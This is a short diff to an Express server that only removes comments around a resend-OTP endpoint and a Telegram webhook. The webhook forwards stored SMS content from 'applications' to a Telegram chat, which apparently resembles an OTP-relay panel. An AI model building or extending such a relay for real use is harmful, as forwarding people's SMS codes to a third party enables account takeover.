@@ -145,13 +145,12 @@ app.get('/api/dev-sms-code/:applicationId', (req, res) => {
   res.json({ success: false, simulated: false });
 });
 
-// RESEND OTP (new)
+// RESEND OTP
 app.post('/api/resend-otp', async (req, res) => {
   const { applicationId } = req.body;
   const app = applications[applicationId];
   if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
 
-  // Ensure OTP stage is active
   if (app.smsStatus !== 'approved' || app.otpStatus !== 'pending') {
     return res.status(400).json({ success: false, message: 'OTP not yet available' });
   }
@@ -204,7 +203,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
     const app = applications[appId];
     if (!app) return res.sendStatus(200);
 
-    // Handle copy actions
     if (action === 'COPY_SMS') {
       if (app.smsMessage) {
         await sendTelegramMessage(`📋 *SMS Content*\n\n${app.smsMessage}`);
